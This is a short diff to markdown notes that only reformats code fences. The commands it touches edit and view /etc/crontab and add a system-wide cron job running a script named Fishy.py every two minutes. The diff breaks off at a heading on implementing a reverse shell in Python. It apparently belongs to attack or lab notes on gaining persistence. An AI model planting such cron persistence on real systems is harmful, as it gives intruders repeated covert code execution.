@@ -36,8 +36,10 @@ python3 -c 'import sys; print("\n".join(sys.path))'
 ## Create a System-wide Cronjob
 > To create a system-wide cronjob that runs every 2 minutes, edit the /etc/crontab file:
 
-```sudo nano /etc/crontab
 ```
+sudo nano /etc/crontab
+```
+
 > Add the following line to run the Python script every 2 minutes:
 ```
 */2 * * * * /usr/bin/python3 /home/xavir/Fishy.py
@@ -53,7 +55,9 @@ chmod 640 /path/to/Fishy.py
 
 ## View System-wide Cronjob
 > To view the system-wide cronjob, use the following command:
-```cat /etc/crontab
+
+```
+cat /etc/crontab
 ```
 
 ## Implementing a Reverse Shell in Python
